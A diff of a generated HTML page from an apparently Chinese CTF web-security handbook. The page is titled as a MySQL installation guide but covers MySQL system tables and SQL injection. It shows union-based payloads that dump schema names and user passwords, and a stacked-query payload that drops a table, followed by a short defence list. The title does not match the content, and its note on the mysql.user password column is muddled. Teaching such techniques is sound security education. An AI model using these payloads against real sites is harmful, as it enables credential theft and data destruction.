@@ -9,23 +9,25 @@
       
       
       
+        <link rel="prev" href="..">
       
-        <link rel="next" href="ENV-1-Mysql%E5%AE%89%E8%A3%85/">
+      
+        <link rel="next" href="../ENV-2-SQL-Hackbar%20%E5%AE%89%E8%A3%85/">
       
       
-      <link rel="icon" href="assets/images/favicon.png">
+      <link rel="icon" href="../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.11">
     
     
       
-        <title>CTF-Web修炼手册</title>
+        <title>ENV-1-MySQL 安装 - CTF-Web修炼手册</title>
       
     
     
-      <link rel="stylesheet" href="assets/stylesheets/main.4af4bdda.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.4af4bdda.min.css">
       
         
-        <link rel="stylesheet" href="assets/stylesheets/palette.06af60db.min.css">
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
       
       
 
@@ -44,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="stylesheets/extra.css">
+      <link rel="stylesheet" href="../stylesheets/extra.css">
     
-    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -72,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#ctf-web" class="md-skip">
+        <a href="#mysql" class="md-skip">
           跳转至
         </a>
       
@@ -86,7 +88,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="页眉">
-    <a href="." title="CTF-Web修炼手册" class="md-header__button md-logo" aria-label="CTF-Web修炼手册" data-md-component="logo">
+    <a href=".." title="CTF-Web修炼手册" class="md-header__button md-logo" aria-label="CTF-Web修炼手册" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m10 17-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9m-6-8L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5z"/></svg>
@@ -106,7 +108,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              开始
+              ENV-1-MySQL 安装
             
           </span>
         </div>
@@ -205,11 +207,9 @@
   
   
   
-    
   
-  
-    <li class="md-tabs__item md-tabs__item--active">
-      <a href="." class="md-tabs__link">
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
         
   
   
@@ -226,11 +226,13 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
-        <a href="ENV-1-Mysql%E5%AE%89%E8%A3%85/" class="md-tabs__link">
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
           
   
   
@@ -250,7 +252,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="SQL-1-Mysql%E7%B3%BB%E7%BB%9F%E8%A1%A8/" class="md-tabs__link">
+        <a href="../SQL-1-Mysql%E7%B3%BB%E7%BB%9F%E8%A1%A8/" class="md-tabs__link">
           
   
   
@@ -270,7 +272,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0%E6%8E%A8%E8%8D%90/" class="md-tabs__link">
+        <a href="../%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0%E6%8E%A8%E8%8D%90/" class="md-tabs__link">
           
   
   
@@ -304,7 +306,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="." title="CTF-Web修炼手册" class="md-nav__button md-logo" aria-label="CTF-Web修炼手册" data-md-component="logo">
+    <a href=".." title="CTF-Web修炼手册" class="md-nav__button md-logo" aria-label="CTF-Web修炼手册" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m10 17-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9m-6-8L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5z"/></svg>
@@ -319,32 +321,10 @@
       
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    开始
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="." class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
         
   
   
@@ -355,71 +335,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      项目介绍
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      内容特点
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      使用指南
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    <span class="md-ellipsis">
-      章节导航
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    <span class="md-ellipsis">
-      持续更新
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -428,28 +343,31 @@
       
   
   
+    
   
   
+  
     
     
     
     
+      
+        
+        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
         
           
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
-        
-          
-          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
             
   
   
@@ -462,7 +380,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             环境配置
@@ -473,10 +391,30 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="ENV-1-Mysql%E5%AE%89%E8%A3%85/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    ENV-1-MySQL 安装
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -487,6 +425,126 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      一、MySQL 系统表简介
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#information_schema" class="md-nav__link">
+    <span class="md-ellipsis">
+      二、information_schema 数据库
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      三、常见的 SQL 注入信息枚举过程
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#information_schema-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      四、基于 information_schema 的 SQL 注入示例
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="四、基于 information_schema 的 SQL 注入示例">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      场景
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      注入步骤
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mysql-mysqluser" class="md-nav__link">
+    <span class="md-ellipsis">
+      五、MySQL 用户账户表 (mysql.user)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="五、MySQL 用户账户表 (mysql.user)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mysql_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：列出 MySQL 用户
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ctf-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      六、CTF 中的 SQL 注入技巧
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      七、SQL 注入防护
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -499,7 +557,7 @@
   
   
     <li class="md-nav__item">
-      <a href="ENV-2-SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-nav__link">
+      <a href="../ENV-2-SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-nav__link">
         
   
   
@@ -574,7 +632,7 @@
   
   
     <li class="md-nav__item">
-      <a href="SQL-1-Mysql%E7%B3%BB%E7%BB%9F%E8%A1%A8/" class="md-nav__link">
+      <a href="../SQL-1-Mysql%E7%B3%BB%E7%BB%9F%E8%A1%A8/" class="md-nav__link">
         
   
   
@@ -597,7 +655,7 @@
   
   
     <li class="md-nav__item">
-      <a href="SQL-2-%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D/" class="md-nav__link">
+      <a href="../SQL-2-%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D/" class="md-nav__link">
         
   
   
@@ -620,7 +678,7 @@
   
   
     <li class="md-nav__item">
-      <a href="SQL-3-information_schema%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      <a href="../SQL-3-information_schema%E5%88%A9%E7%94%A8/" class="md-nav__link">
         
   
   
@@ -643,7 +701,7 @@
   
   
     <li class="md-nav__item">
-      <a href="SQL-4-%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+      <a href="../SQL-4-%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/" class="md-nav__link">
         
   
   
@@ -666,7 +724,7 @@
   
   
     <li class="md-nav__item">
-      <a href="SQL-5-bool%E7%9B%B2%E6%B3%A8%E6%80%9D%E8%B7%AF/" class="md-nav__link">
+      <a href="../SQL-5-bool%E7%9B%B2%E6%B3%A8%E6%80%9D%E8%B7%AF/" class="md-nav__link">
         
   
   
@@ -689,7 +747,7 @@
   
   
     <li class="md-nav__item">
-      <a href="SQL-6-bool%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%8F%82%E8%80%83/" class="md-nav__link">
+      <a href="../SQL-6-bool%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%8F%82%E8%80%83/" class="md-nav__link">
         
   
   
@@ -764,7 +822,7 @@
   
   
     <li class="md-nav__item">
-      <a href="%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0%E6%8E%A8%E8%8D%90/" class="md-nav__link">
+      <a href="../%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0%E6%8E%A8%E8%8D%90/" class="md-nav__link">
         
   
   
@@ -804,8 +862,6 @@
   
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -814,45 +870,102 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      一、MySQL 系统表简介
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#information_schema" class="md-nav__link">
+    <span class="md-ellipsis">
+      二、information_schema 数据库
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      三、常见的 SQL 注入信息枚举过程
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#information_schema-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      四、基于 information_schema 的 SQL 注入示例
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="四、基于 information_schema 的 SQL 注入示例">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
     <span class="md-ellipsis">
-      项目介绍
+      场景
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
+        
+          <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
-      内容特点
+      注入步骤
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mysql-mysqluser" class="md-nav__link">
+    <span class="md-ellipsis">
+      五、MySQL 用户账户表 (mysql.user)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="五、MySQL 用户账户表 (mysql.user)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mysql_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：列出 MySQL 用户
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ctf-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      六、CTF 中的 SQL 注入技巧
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
+  <a href="#sql_1" class="md-nav__link">
     <span class="md-ellipsis">
-      使用指南
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    <span class="md-ellipsis">
-      章节导航
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    <span class="md-ellipsis">
-      持续更新
+      七、SQL 注入防护
     </span>
   </a>
   
@@ -874,51 +987,188 @@
 
 
 
-<h1 id="ctf-web">CTF-Web修炼手册</h1>
-<h2 id="_1">项目介绍</h2>
-<p>欢迎来到 CTF-Web 修炼手册！这是一个专注于 Web 安全和 CTF Web 题目的学习指南。本手册将帮助您：</p>
+  <h1>ENV-1-MySQL 安装</h1>
+
+<h3 id="mysql">一、MySQL 系统表简介</h3>
+<p>MySQL 的 <strong>系统表</strong> 存储在 <code>information_schema</code> 和 <code>mysql</code> 数据库中。它们保存了数据库的元数据，如表、列、用户权限、字符集等信息。</p>
 <ul>
-<li>🛠️ 配置必要的工具环境</li>
-<li>🔍 掌握 SQL 注入技巧</li>
-<li>💡 理解常见的 Web 漏洞</li>
-<li>🎯 提升 CTF 比赛解题能力</li>
+<li><code>information_schema</code>: 存储 MySQL 数据库服务器的元数据信息，用户可以查询这些表来了解数据库的结构。</li>
+<li><code>mysql</code>: 存储 MySQL 用户账户、权限等安全相关的信息。通常只有高权限用户才能访问。</li>
 </ul>
-<h2 id="_2">内容特点</h2>
-<ul>
-<li>📚 系统化的知识结构</li>
-<li>🔰 从基础到进阶的学习路径</li>
-<li>💻 丰富的实战案例</li>
-<li>🎓 详细的技术讲解</li>
-</ul>
-<h2 id="_3">使用指南</h2>
-<ol>
-<li>首先在【工具安装】部分配置好必要的环境</li>
-<li>按照目录顺序循序渐进地学习</li>
-<li>动手实践每个案例，加深理解</li>
-<li>参考代码和技巧，举一反三</li>
-</ol>
-<h2 id="_4">章节导航</h2>
-<ul>
-<li><strong>工具安装</strong></li>
-<li>Firefox 浏览器配置</li>
-<li>
-<p>HackBar 插件使用</p>
-</li>
-<li>
-<p><strong>SQL 注入系列</strong></p>
-</li>
-<li>SQL 注入基础知识</li>
-<li>information_schema 详解</li>
-<li>普通注入技巧</li>
-<li>布尔盲注方法</li>
-<li>盲注逻辑进阶</li>
-</ul>
-<h2 id="_5">持续更新</h2>
-<p>本手册将持续更新和完善，欢迎关注最新内容！</p>
 <hr />
-<blockquote>
-<p>🔔 <strong>温馨提示</strong>：在进行安全测试时，请确保遵守相关法律法规，只在授权的环境中进行测试。</p>
-</blockquote>
+<h3 id="information_schema">二、<code>information_schema</code> 数据库</h3>
+<p><code>information_schema</code> 是 MySQL 的元数据表，主要包含以下常用的系统表：</p>
+<table>
+<thead>
+<tr>
+<th>系统表</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>TABLES</code></td>
+<td>存储所有数据库中表的信息，如表名、表类型等。</td>
+</tr>
+<tr>
+<td><code>COLUMNS</code></td>
+<td>存储所有数据库中列的信息，如列名、数据类型等。</td>
+</tr>
+<tr>
+<td><code>SCHEMATA</code></td>
+<td>存储所有数据库的名称。</td>
+</tr>
+<tr>
+<td><code>KEY_COLUMN_USAGE</code></td>
+<td>存储主键、外键等约束信息。</td>
+</tr>
+<tr>
+<td><code>USER_PRIVILEGES</code></td>
+<td>存储用户权限信息。</td>
+</tr>
+<tr>
+<td><code>CHARACTER_SETS</code></td>
+<td>存储 MySQL 支持的字符集信息。</td>
+</tr>
+<tr>
+<td><code>COLLATIONS</code></td>
+<td>存储排序规则相关信息。</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="sql">三、常见的 SQL 注入信息枚举过程</h3>
+<p>通过 <strong>SQL 注入</strong> 攻击，参赛者可以利用系统表来泄露数据库中的敏感信息。以下是常见的步骤：</p>
+<p><strong>获取数据库名称</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>SELECT schema_name FROM information_schema.schemata;
+</code></pre></div>
+<ul>
+<li>获取当前 MySQL 实例中所有数据库的名称。</li>
+</ul>
+<p><strong>获取表名称</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>SELECT table_name FROM information_schema.tables WHERE table_schema=&#39;目标数据库&#39;;
+</code></pre></div>
+<ul>
+<li>查询某个数据库 (<code>table_schema</code>) 中的所有表名。</li>
+</ul>
+<p><strong>获取列名称</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>SELECT column_name FROM information_schema.columns WHERE table_name=&#39;目标表&#39; AND table_schema=&#39;目标数据库&#39;;
+</code></pre></div>
+<ul>
+<li>查询某个表中的所有列名。</li>
+</ul>
+<p><strong>获取表的数据</strong> 一旦知道了表名和列名，可以通过 SQL 注入来获取表内的数据，例如：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>SELECT login_name, login_passwd FROM lesson_user;
+</code></pre></div>
+<hr />
+<h3 id="information_schema-sql">四、基于 <code>information_schema</code> 的 SQL 注入示例</h3>
+<p>假设一个网站存在 SQL 注入漏洞，我们将通过注入获取数据库信息。以下是一个注入场景示例。</p>
+<h4 id="_1">场景</h4>
+<p>网站存在以下查询：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;;
+</code></pre></div>
+<p>攻击者可以通过修改输入来进行 SQL 注入。</p>
+<h4 id="_2">注入步骤</h4>
+<p><strong>获取数据库名称</strong></p>
+<ul>
+<li>注入 Payload：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>&#39; OR 1=1 UNION SELECT schema_name, NULL FROM information_schema.schemata #
+</code></pre></div>
+<ul>
+<li>解释：通过 <code>UNION SELECT</code> 合并查询，列出所有数据库名称。</li>
+</ul>
+<p><strong>获取表名</strong></p>
+<ul>
+<li>注入 Payload：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>&#39; OR 1=1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=&#39;目标数据库&#39; #
+</code></pre></div>
+<ul>
+<li>解释：查询特定数据库中的所有表。</li>
+</ul>
+<p><strong>获取列名</strong></p>
+<ul>
+<li>注入 Payload：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&#39; OR 1=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=&#39;users&#39; #
+</code></pre></div>
+<ul>
+<li>解释：查询特定表中的所有列名。</li>
+</ul>
+<p><strong>获取敏感数据</strong></p>
+<ul>
+<li>注入 Payload：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&#39; OR 1=1 UNION SELECT username, password FROM users #
+</code></pre></div>
+<ul>
+<li>解释：获取 <code>users</code> 表中的用户名和密码。</li>
+</ul>
+<hr />
+<h3 id="mysql-mysqluser">五、MySQL 用户账户表 (<code>mysql.user</code>)</h3>
+<p><code>mysql.user</code> 是存储 MySQL 用户信息的表，通常只有高权限用户可以访问。</p>
+<table>
+<thead>
+<tr>
+<th>列名</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Host</code></td>
+<td>用户允许登录的主机。</td>
+</tr>
+<tr>
+<td><code>User</code></td>
+<td>用户名。</td>
+</tr>
+<tr>
+<td><code>Password</code></td>
+<td>用户密码（MySQL 8.0 之前存储为 <code>authentication_string</code>）。</td>
+</tr>
+<tr>
+<td><code>Select_priv</code></td>
+<td>是否有 <code>SELECT</code> 权限。</td>
+</tr>
+<tr>
+<td><code>Insert_priv</code></td>
+<td>是否有 <code>INSERT</code> 权限。</td>
+</tr>
+<tr>
+<td>...</td>
+<td>其他权限字段，如 <code>UPDATE</code>, <code>DELETE</code> 等。</td>
+</tr>
+</tbody>
+</table>
+<p>通过 SQL 注入，攻击者可以尝试获取用户表中的信息，从而进行进一步攻击。</p>
+<h4 id="mysql_1">示例：列出 MySQL 用户</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>SELECT user, host FROM mysql.user;
+</code></pre></div>
+<hr />
+<h3 id="ctf-sql">六、CTF 中的 SQL 注入技巧</h3>
+<ul>
+<li>
+<p><strong>盲注</strong>：当页面没有明显返回查询结果时，可以通过布尔盲注和时间盲注推测信息。</p>
+</li>
+<li>
+<p><strong>基于 <code>UNION</code> 的注入</strong>：用于获取多个表的结果，特别是当页面返回数据时。</p>
+</li>
+<li>
+<p>堆叠查询</p>
+</li>
+</ul>
+<p>（仅限某些数据库支持）：在一条语句中执行多个查询。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>&#39; OR 1=1; DROP TABLE lesson_user; #
+</code></pre></div>
+<h3 id="sql_1">七、SQL 注入防护</h3>
+<ol>
+<li><strong>使用预处理语句 (Prepared Statements)</strong>：防止 SQL 注入。</li>
+<li><strong>输入验证</strong>：对用户输入进行过滤和验证，防止恶意字符注入。</li>
+<li><strong>最小权限原则</strong>：限制数据库用户的权限，防止数据被恶意篡改。</li>
+<li><strong>隐藏系统信息</strong>：避免将错误信息直接暴露给用户，防止信息泄露。</li>
+</ol>
 
 
 
@@ -975,10 +1225,10 @@
     
     
       
-      <script id="__config" type="application/json">{"base": ".", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link"], "search": "assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link"], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
     
     
-      <script src="assets/javascripts/bundle.c8b220af.min.js"></script>
+      <script src="../assets/javascripts/bundle.c8b220af.min.js"></script>
       
     
   </body>
